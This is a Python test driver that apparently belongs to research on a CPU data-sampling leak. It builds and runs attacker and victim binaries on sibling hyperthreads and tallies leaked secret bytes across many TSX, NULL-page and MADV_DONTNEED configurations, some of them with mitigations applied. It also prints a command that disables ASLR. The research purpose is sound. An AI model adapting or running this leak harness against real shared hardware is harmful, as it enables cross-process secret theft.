#!/usr/bin/python3
import subprocess
from subprocess import PIPE
import time
import select
import argparse
import autocore

strpass = "PASS"
strgood = "GOOD" # expected fail
strfail = "FAIL"
try:
	import colorama
	strpass = colorama.Fore.GREEN + strpass + colorama.Style.RESET_ALL
	strgood = colorama.Fore.GREEN + strgood + colorama.Style.RESET_ALL
	strfail = colorama.Fore.RED + strfail + colorama.Style.RESET_ALL
except:
	colorama = None
	pass

#firstproc = [i for i in autocore.get_hypergroups()][0]
firstproc = [i for i in autocore.get_hypergroups()][2]
if len(firstproc) < 2:
	print("you seem to have disabled SMT, so the SMT tests won't work")
	print("if you didn't then please specify core IDs manually (see --help)")
	nosmt = True
	victimproc = -1
else:
	victimproc = firstproc[1]

secondproc = [i for i in autocore.get_hypergroups()][1]
if len(secondproc) < 2:
	#print("you disabled SMT on the second core, good job")
	otherproc = secondproc[0]
else:
	print("WARNING: you should disable SMT on your second core to avoid noise")
	# TODO: fixme for 2-core systems
	otherproc = firstproc[0] + 1
	if otherproc == victimproc:
		otherproc = otherproc + 1

print("using core %d for non-SMT, core %d (victim %d) for SMT" % (otherproc, firstproc[0], victimproc))

parser = argparse.ArgumentParser()
parser.add_argument("--core-victim", default=victimproc)
parser.add_argument("--core-attacker", default=firstproc[0])
parser.add_argument("--core-other", default=otherproc)
# WARNING: counters enabled can break test cases (for example the non-TSX ones)
# useful: machine_clears.memory_ordering mem_load_uops_retired.hit_lfb rtm_retired.aborted uops_issued.any uops_retired.all
# probably not: resource_stalls.sb dtlb_store_misses.stlb_hit dtlb_store_misses.miss_causes_a_walk dtlb_load_misses.stlb_hit dtlb_load_misses.miss_causes_a_walk
parser.add_argument("--perf-counter", action='append')
parser.add_argument("--iters", default=1000)
parser.add_argument("--more-tests", default=False)
parser.add_argument("--log", action="store_true")
parser.add_argument("--verbose", action="store_true")
parser.add_argument("--attacker-flags", default='')
args = parser.parse_args()

perf_counter = args.perf_counter
iters = int(args.iters)
core_victim = args.core_victim
core_attacker = args.core_attacker
core_bad = args.core_other
logging = args.log
verbose = args.verbose
more_tests = args.more_tests

extraattackerflags=''
if args.attacker_flags:
	extraattackerflags = args.attacker_flags
extravictimflags=''

def runTest(desc=None, attacker='binaries/may10leak', victim=None, victimflags='', attackerflags='', expected_str='', timeout=2, shouldfail=False, core0 = core_victim, core1 = core_attacker, show_all_vals=False):
	attackerflags = (extraattackerflags + ' ' + attackerflags).strip()
	victimflags = (extravictimflags + ' ' + victimflags).strip()
	victimtext = victim
	if victimflags:
		victimtext = victimtext + '('+victimflags+')'
	if not desc:
		desc = attackerflags
		if victim or victimflags:
			if desc and desc != '-DUSE_TSX':
				desc = desc + ', '
			desc = desc + 'victim: ' + victim + ' ' + victimflags
	if not perf_counter:
		attackerflags = attackerflags + " -DNO_COUNTERS"
	attackerflags = attackerflags + " -DITERS="+str(iters)
	if '-DUSE_TSX' in desc:
		desc = desc.replace('-DUSE_TSX ', '')
		desc = desc.replace('-DUSE_TSX', '')
		desc = '[TSX] ' + desc
	if victim:
		desc = '[SMT] ' + desc
	if shouldfail:
		desc = desc + ' [expecting no signal]'
	print(' TEST: %s' % desc)
	if not victim:
		core1 = core_bad
	if victim and core0 == -1:
		print('Skipping: no SMT.')
		return
	if verbose:
		print('running (%s):   %s\nleaking (%s):   %s\n    expecting: %s' % (core0, victimtext, core1, attackerflags, expected_str))
	if victim:
		subprocess.run('make clean', shell=True, check=True, stdout=PIPE)
	else:
		subprocess.run('make clean-attacker', shell=True, check=True, stdout=PIPE)
	subprocess.run('make binaries/may10leak VICTIMFLAGS="%s" ATTACKERFLAGS="%s"' % (victimflags, attackerflags), shell=True, check=True, stdout=PIPE)
	if victim:
		subprocess.run('cd victims && make binaries/' + victim + '.bin VICTIMFLAGS="%s" ATTACKERFLAGS="%s"' % (victimflags, attackerflags), shell=True, check=True, stdout=PIPE)
	victimp = None
	attackerp = None
	expected_str = expected_str.encode('utf-8')
	try:
		if victim:
			victimp = subprocess.Popen(['taskset', '-c', str(core0), 'victims/binaries/'+victim+'.bin'])
		if perf_counter:
			attackerp = subprocess.Popen(['taskset', '-c', str(core1), attacker, "0"] + perf_counter, stdout=PIPE, bufsize=0)
		else:
			attackerp = subprocess.Popen(['taskset', '-c', str(core1), attacker], stdout=PIPE, bufsize=0)
		start_time = time.time()
		if not expected_str:
			output = str(attackerp.communicate()[0], 'utf-8').split('\n')
			total = 0
			vals = {}
			for line in output:
				ls = line.split()
				if len(ls) == 0: continue
				if ls[0] == 'total:':
					total = int(ls[1])
				else:
					vals[int(ls[1], 16)] = int(ls[0][:-1])
			#output = ", ".join(sorted(output, reverse=True))
			output = "total: %8d" % total
			if total != 0:
				knownvals = [0x42, 0x84, 0x00, 0x01]
				noise = 0
				sorted_vals = reversed(sorted(vals.items(), key=lambda kv: kv[1]))
				for v in sorted_vals:
					v = v[0]
					threshold = iters / 100
					if vals[v] and (v in knownvals or show_all_vals or vals[v] > threshold):
						#output = output + (", %6d (%3d%%): 0x%02x" % (vals[v], (100*vals[v])/total, v))
						output = output + (", %4.2f%%: 0x%02x" % ((100.0*vals[v])/iters, v))
					else:
						noise = noise + vals[v]
				if noise:
					output = output + (", other: %6d" % noise)
			if colorama:
				output = output.replace("0x42", colorama.Fore.GREEN + "0x42" + colorama.Style.RESET_ALL)
				output = output.replace("0x84", colorama.Fore.CYAN + "0x84" + colorama.Style.RESET_ALL)
				output = output.replace("0x00", colorama.Fore.RED + "0x00" + colorama.Style.RESET_ALL)
				output = output.replace("0x01", colorama.Fore.BLUE + "0x01" + colorama.Style.RESET_ALL)
			print("  " + output)
			return
		log = b""
		while True:
			poll_result = select.select([attackerp.stdout], [], [], timeout/10.0)[0]

			elapsed_time = time.time() - start_time
			if elapsed_time > timeout:
				if shouldfail:
					print(strgood + ': timeout after %ds' % elapsed_time)
					return True
				print(strfail + ': timeout after %ds' % elapsed_time)
				if logging:
					print(log)
				return False
			if not poll_result:
				continue

			out = attackerp.stdout.readline()
			if logging:
				log = log + out
			if expected_str in out:
				out = out.strip()
				if shouldfail:
					print(strfail + ': (%ds) ' % elapsed_time + str(out, 'utf-8'))
					return False
				print(strpass + ': (%ds) ' % elapsed_time + str(out, 'utf-8'))
				return True
	finally:
		if victimp:
			victimp.kill()
		if attackerp:
			attackerp.kill()

spec_bypass_mitigation = False
if spec_bypass_mitigation:
	extraattackerflags = extraattackerflags + ' -DBYPASS_PRCTL'
	extravictimflags = extravictimflags + ' -DSPEC_BYPASS'

def comment(s=None):
	if not s:
		print()
		return
	if colorama:
		s = colorama.Fore.YELLOW + s + colorama.Style.RESET_ALL
	print("# " + s)

print("%d iterations per test" % int(iters))
if perf_counter:
	print("WARNING: Reading performance counters breaks some of the tests.")
print()
print("# NOTE: Our leak page is full of 0x01. The secret is 0x42 (self-leak) or 0x84 (SMT victim).")
print("# When self-leaking, we perform an operation (by default, write), THEN\n  we flush the reload buffer (lots of cycles), do some magic, and then leak+reload.")
print("# You should enable all the cool mitigations. Also, ideally:")
print("echo 0 | sudo tee /proc/sys/kernel/randomize_va_space")
print("./test.py --iters 10000 --more-tests 1")
print("")

#while True:
#	runTest(attackerflags='-DUSE_TSX')
#	runTest(attackerflags='-DUSE_TSX -DPREFETCH_LEAK')

comment("Baseline: self-leaking.")
runTest(attackerflags='-DUSE_TSX')
comment("Baseline: self-leaking, victim in a busyloop.")
runTest(attackerflags='-DUSE_TSX', victim='donothing', victimflags='')
comment("Baseline: self-leaking, victim MFENCEing (adds zeros).")
runTest(attackerflags='-DUSE_TSX', victim='donothing', victimflags='-DMFENCE')
if more_tests:
	comment("Extra cases to confirm the above.")
	runTest(attackerflags='-DUSE_TSX', victim='donothing', victimflags='-DNOP')
	runTest(attackerflags='-DUSE_TSX -DNO_SACRIFICE')
	runTest(attackerflags='-DUSE_TSX -DNO_SACRIFICE', victim='donothing', victimflags='')
	runTest(attackerflags='-DUSE_TSX -DNO_SACRIFICE', victim='donothing', victimflags='-DMFENCE')
	runTest(attackerflags='-DUSE_TSX -DNO_SACRIFICE', victim='donothing', victimflags='-DNOP')

comment()
comment("Victim writing, attacker self-writing.")
comment("Simple case: we leak only the victim value.")
runTest(attackerflags='-DUSE_TSX', victim='simplezapper', victimflags='')
comment("If the victim writes different values (0x4, 0x44, 0x84, 0xc4), we get all of them.")
runTest(attackerflags='-DUSE_TSX', victim='cyclezapper', victimflags='')
comment("If the victim uses mfence, then we also leak zeros (and our self-leak).")
runTest(attackerflags='-DUSE_TSX', victim='simplezapper', victimflags='-DMFENCE')
comment("With clflushopt, we see TWO leaks, the victim value and the real one.")
runTest(attackerflags='-DUSE_TSX -DUSE_CLFLUSHOPT', victim='simplezapper', victimflags='')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DUSE_CLFLUSHOPT', victim='simplezapper', victimflags='-DMFENCE')
comment("If we don't self-leak, both signals vanish.")
runTest(attackerflags='-DUSE_TSX -DNO_STORE_SECRET', victim='simplezapper', victimflags='')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DNO_STORE_SECRET', victim='simplezapper', victimflags='-DMFENCE')
comment("clflushopt adds some randomness into the situation, which can help.")
runTest(attackerflags='-DUSE_TSX -DUSE_CLFLUSHOPT -DNO_STORE_SECRET', victim='simplezapper', victimflags='')
runTest(attackerflags='-DUSE_TSX -DUSE_CLFLUSHOPT -DNO_STORE_SECRET', victim='simplezapper', victimflags='-DMFENCE')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='simplezapper', victimflags='-DMFENCE')
	runTest(attackerflags='-DUSE_TSX -DNO_SACRIFICE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='simplezapper', victimflags='-DMFENCE')
comment("An mfence on the attacker side also kills both signals.")
runTest(attackerflags='-DUSE_TSX -DMITIGATION_MFENCE', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DMITIGATION_MFENCE -DUSE_CLFLUSHOPT', victim='simplezapper', victimflags='-DMFENCE')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DMITIGATION_MFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='simplezapper', victimflags='-DMFENCE')
	runTest(attackerflags='-DUSE_TSX -DMITIGATION_MFENCE')
comment("Leaking via NULL (NO_SACRIFICE is implied) doesn't work by itself..")
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK', victim='simplezapper', victimflags='')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK', victim='simplezapper', victimflags='-DMFENCE')
comment("Although some jamming of reads on the attacker side helps a bit.")
runTest(attackerflags='-DUSE_TSX -DJAMMING -DNULL_LEAK', victim='simplezapper', victimflags='')
runTest(attackerflags='-DUSE_TSX -DJAMMING -DNULL_LEAK', victim='simplezapper', victimflags='-DMFENCE')
comment("With NULL, you see (only) the victim signal if we mfence on the attacker side.")
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DONLY_SFENCE', victim='simplezapper', victimflags='-DMFENCE')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNON_TEMPORAL', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNON_TEMPORAL_END', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNON_TEMPORAL -DNON_TEMPORAL_END', victim='simplezapper', victimflags='-DMFENCE')
comment("Jamming (or clflushopt) makes these leaks more reliable, too.")
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DUSE_CLFLUSHOPT', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DJAMMING', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DJAMMING', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DJAMMING -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DJAMMING -DNON_TEMPORAL -DNON_TEMPORAL_END', victim='simplezapper', victimflags='-DMFENCE')
comment("We can still leak from a victim which is mostly executing NOPs, but the signal is oddly flaky between runs..")
runTest(attackerflags='-DUSE_TSX', victim='slowzapper', victimflags='-DMFENCE_AFTER')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='-DMFENCE_AFTER')
if more_tests:
	runTest(attackerflags='-DUSE_TSX', victim='slowzapper', victimflags='-DMFENCE_BEFORE')
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='-DMFENCE_BEFORE')
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_MFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='-DMFENCE_BEFORE -DMFENCE_AFTER')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DONLY_SFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DONLY_SFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='-DMFENCE_BEFORE')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DONLY_SFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='-DMFENCE_AFTER')
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DONLY_SFENCE -DNO_STORE_SECRET -DNO_FLUSH_SECRET', victim='slowzapper', victimflags='-DMFENCE_BEFORE -DMFENCE_AFTER')
comment("We can also leak from another thread without TSX, using a MADV_DONTNEED page.")
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE -DJAMMING', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE -DUSE_CLFLUSHOPT', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE -DCLFLUSHOPT_FLUSH', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE -DCLFLUSHOPT_FLUSH -DSFENCE_AFTER_FLUSH', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE -DSFENCE_AFTER_FLUSH', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DMADVISE_AWAY -DUSE_CLFLUSHOPT', victim='simplezapper', victimflags='-DMFENCE')
runTest(attackerflags='-DBUF_OFFSET=0x0 -DMADVISE_AWAY -DSPECULATE_SFENCE -DNO_SACRIFICE -DUSE_CLFLUSHOPT -DSFENCE_AFTER_FLUSH', victim='simplezapper')
comment("Reading twice doesn't seem to make a difference here.")
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE -DCLFLUSHOPT_FLUSH -DRELOAD_TWICE', victim='simplezapper', victimflags='-DMFENCE')
comment("Jamming+clflush helps a lot. Need more speculation.")
runTest(attackerflags='-DMADVISE_AWAY -DNO_SACRIFICE -DCLFLUSHOPT_FLUSH -DJAMMING', victim='simplezapper', victimflags='-DMFENCE')

comment()
comment("Self-leaking using TSX is relatively easy.")
runTest(attackerflags='-DUSE_TSX')
runTest(attackerflags='-DUSE_TSX -DSECRET_VALUE=0x99')
runTest(attackerflags='-DUSE_TSX -DSECRET_VALUE=0xd8')
comment("But only if you know the right magic.")
runTest(attackerflags='-DUSE_TSX -DNO_SACRIFICE')
runTest(attackerflags='-DUSE_TSX -DNO_SACRIFICE -DONLY_SFENCE')
runTest(attackerflags='-DUSE_TSX -DNO_SFENCE')
comment("It doesn't work without TSX.")
runTest(attackerflags='')
runTest(attackerflags='-DNULL_LEAK -DSIGNAL_HANDLER')
runTest(attackerflags='-DMADVISE_AWAY')
if more_tests:
	runTest(attackerflags='-DSPECULATE_SFENCE')
	runTest(attackerflags='-DNULL_LEAK -DSIGNAL_HANDLER -DCLFLUSHOPT_FLUSH')
	runTest(attackerflags='-DNULL_LEAK -DSIGNAL_HANDLER -DCLFLUSHOPT_FLUSH -DMITIGATION_MFENCE')
	runTest(attackerflags='-DMADVISE_AWAY -DSPECULATE_SFENCE')
	runTest(attackerflags='-DMADVISE_AWAY -DCLFLUSHOPT_FLUSH')
	runTest(attackerflags='-DMADVISE_AWAY -DCLFLUSHOPT_FLUSH -DMITIGATION_MFENCE')
comment("There are mitigations which block the signal (we do them just before leaking).")
runTest(attackerflags='-DUSE_TSX -DMITIGATION_MFENCE')
runTest(attackerflags='-DUSE_TSX -DMITIGATION_SFENCE')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DMITIGATION_MFENCE -DNO_FLUSH_SECRET -DFLUSH_AFTER_MITIGATION')
	runTest(attackerflags='-DUSE_TSX -DMITIGATION_SFENCE -DNO_FLUSH_SECRET -DFLUSH_AFTER_MITIGATION')
comment("This one overwrites the secret with 0x54 just beforehand.")
runTest(attackerflags='-DUSE_TSX -DMITIGATION_OVERWRITE')
runTest(attackerflags='-DUSE_TSX -DMITIGATION_OVERWRITE -DNO_FLUSH_SECRET')
comment("But if we move the flush to after the overwrite, we get the first value!")
runTest(attackerflags='-DUSE_TSX -DMITIGATION_OVERWRITE -DNO_FLUSH_SECRET -DFLUSH_AFTER_MITIGATION')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DMITIGATION_OVERWRITE -DNO_FLUSH_SECRET -DFLUSH_AFTER_MITIGATION -DFLUSH_AGAIN_AFTER_MITIGATION')
	runTest(attackerflags='-DUSE_TSX -DMITIGATION_OVERWRITE -DFLUSH_AFTER_MITIGATION -DFLUSH_AGAIN_AFTER_MITIGATION')
comment("And just waiting (lots of NOPs) or lfence is fine.")
runTest(attackerflags='-DUSE_TSX -DMITIGATION_WAIT')
runTest(attackerflags='-DUSE_TSX -DMITIGATION_LFENCE')
comment("If you don't store the secret, or flush the secret (sync step), no leak.")
runTest(attackerflags='-DUSE_TSX -DNO_STORE_SECRET')
runTest(attackerflags='-DUSE_TSX -DNO_FLUSH_SECRET')

comment("If we read the secret with a temporal read, we get the underlying memory leaking in.")
comment(" (Note also that we're suddenly leaking twice, so we're speculatively executing.)")
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK')
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DUSE_MOVDQA')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DUSE_MOVDQU')
comment("The same applies if we touch the reload page temporally.")
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DTEMPORAL_LEAK_END')
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK_END')
comment("What if we do a random prefetch just before leaking, inside TSX?")
runTest(attackerflags='-DUSE_TSX -DRANDOM_PREFETCH')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DRANDOM_PREFETCH -DTEMPORAL_LEAK')
	runTest(attackerflags='-DUSE_TSX -DRANDOM_PREFETCH -DTEMPORAL_LEAK_END')
comment("Touching the reload page using prefetch is comparable to the base case though.")
runTest(attackerflags='-DUSE_TSX -DPREFETCH_LEAK')
comment("clflushopt is a bit noisier, typically.")
runTest(attackerflags='-DUSE_TSX -DCLFLUSHOPT_FLUSH')
runTest(attackerflags='-DUSE_TSX -DCLFLUSHOPT_FLUSH -DSFENCE_AFTER_FLUSH')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DUSE_CLFLUSHOPT')
	runTest(attackerflags='-DUSE_TSX -DUSE_CLFLUSHOPT -DSFENCE_AFTER_FLUSH')
comment("mfence sometimes kills the signal when we're self-leaking?")
runTest(attackerflags='-DUSE_TSX -DMFENCE_AFTER_FLUSH')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DUSE_CLFLUSHOPT -DMFENCE_AFTER_FLUSH')

comment()
comment("Leaking reads doesn't work in the same way.")
runTest(attackerflags='-DUSE_TSX -DLEAK_READ')
comment("We need a combination of options to make it work.")
runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DCLFLUSHOPT_FLUSH')
runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DSPECULATE_SFENCE -DCLFLUSHOPT_FLUSH -DSFENCE_AFTER_FLUSH')
runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DSPECULATE_SFENCE')
runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DUSE_CLFLUSHOPT')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DSPECULATE_SFENCE -DCLFLUSHOPT_FLUSH -DSFENCE_AFTER_FLUSH -DRELOAD_TWICE')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DSPECULATE_SFENCE -DUSE_CLFLUSHOPT')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DSPECULATE_SFENCE -DUSE_CLFLUSHOPT -DSFENCE_AFTER_FLUSH')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DSPECULATE_SFENCE -DCLFLUSHOPT_FLUSH -DMFENCE_AFTER_FLUSH')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DSPECULATE_SFENCE -DSFENCE_AFTER_FLUSH')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DUSE_CLFLUSHOPT -DSFENCE_AFTER_FLUSH')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DUSE_CLFLUSHOPT -DNO_SFENCE')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DUSE_CLFLUSHOPT -DNO_FLUSH_SECRET')
	runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DUSE_CLFLUSHOPT -DNO_FLUSH_SECRET -DNO_SFENCE')
comment("The non-temporal store (movnti) leaks just like reads.")
runTest(attackerflags='-DUSE_TSX -DNON_TEMPORAL')
runTest(attackerflags='-DUSE_TSX -DNON_TEMPORAL -DSPECULATE_SFENCE -DCLFLUSHOPT_FLUSH -DSFENCE_AFTER_FLUSH')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DNON_TEMPORAL -DSPECULATE_SFENCE -DUSE_CLFLUSHOPT -DSFENCE_AFTER_FLUSH')

comment()
comment("You can't self-leak using a NULL page (yet?)")
# NO_SACRIFICE is enabled by default for NULL_LEAK
runTest(attackerflags='-DUSE_TSX -DNULL_LEAK')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DMITIGATION_SFENCE')
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DUSE_CLFLUSHOPT')
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DCLFLUSHOPT_FLUSH')
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DCLFLUSHOPT_FLUSH -DMFENCE_AFTER_FLUSH')
	runTest(attackerflags='-DUSE_TSX -DNULL_LEAK -DCLFLUSHOPT_FLUSH -DSFENCE_AFTER_FLUSH')
runTest(attackerflags='-DUSE_TSX -DLEAK_READ -DNULL_LEAK')
runTest(attackerflags='-DUSE_TSX -DNON_TEMPORAL -DNULL_LEAK')
comment("You can leak using a MADV_DONTNEED page, which involves a *page fault*. What the heck?")
runTest(attackerflags='-DUSE_TSX -DMADVISE_AWAY')
runTest(attackerflags='-DUSE_TSX -DMADVISE_AWAY -DLEAK_READ -DSPECULATE_SFENCE -DCLFLUSHOPT_FLUSH')
runTest(attackerflags='-DUSE_TSX -DMADVISE_AWAY -DNON_TEMPORAL -DSPECULATE_SFENCE -DCLFLUSHOPT_FLUSH')

comment()
comment("BEWARE: To avoid cache conflicts (reload buffer is 0x80+0x400*n, results buffer is 0),")
comment(" VICTIM_OFFSET is 0x180 by default, and READ_OFFSET is 0x100. The following may be noisier.")
comment("The non-temporal leak has to be 16-byte aligned (aligned instruction)..")
runTest(attackerflags='-DUSE_TSX -DREAD_OFFSET=0x0 -DVICTIM_OFFSET=0x0')
runTest(attackerflags='-DUSE_TSX -DREAD_OFFSET=0x8 -DVICTIM_OFFSET=0x8')
runTest(attackerflags='-DUSE_TSX -DREAD_OFFSET=0x10 -DVICTIM_OFFSET=0x10')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DREAD_OFFSET=0x1 -DVICTIM_OFFSET=0x1')
	runTest(attackerflags='-DUSE_TSX -DREAD_OFFSET=0x110 -DVICTIM_OFFSET=0x10')
	runTest(attackerflags='-DUSE_TSX -DREAD_OFFSET=0x10 -DVICTIM_OFFSET=0x110')
comment("So we go back to the temporal leaking for these tests, unfortunately..")
comment("You need to leak from a 64-byte-aligned offset.")
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DUSE_MOVDQU -DREAD_OFFSET=0x1 -DVICTIM_OFFSET=0x1')
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=0x1 -DVICTIM_OFFSET=0x1')
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=0x1 -DVICTIM_OFFSET=0x0')
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=0x0 -DVICTIM_OFFSET=0x1')
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=0x100 -DVICTIM_OFFSET=0x100')
runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=0x101 -DVICTIM_OFFSET=0x101')
if more_tests:
	runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=0x40 -DVICTIM_OFFSET=0x0')
	runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=0x0 -DVICTIM_OFFSET=0x40')
	comment("Definitely 64, right?")
	runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=40 -DVICTIM_OFFSET=8')
	runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=68 -DVICTIM_OFFSET=4')
	runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=20 -DVICTIM_OFFSET=84')
	runTest(attackerflags='-DUSE_TSX -DTEMPORAL_LEAK -DREAD_OFFSET=84 -DVICTIM_OFFSET=20')
comment("We filled the second leak page with 0x02, just as a sanity check.")
runTest(attackerflags='-DUSE_TSX -DREAD_OFFSET=4096 -DVICTIM_OFFSET=0')

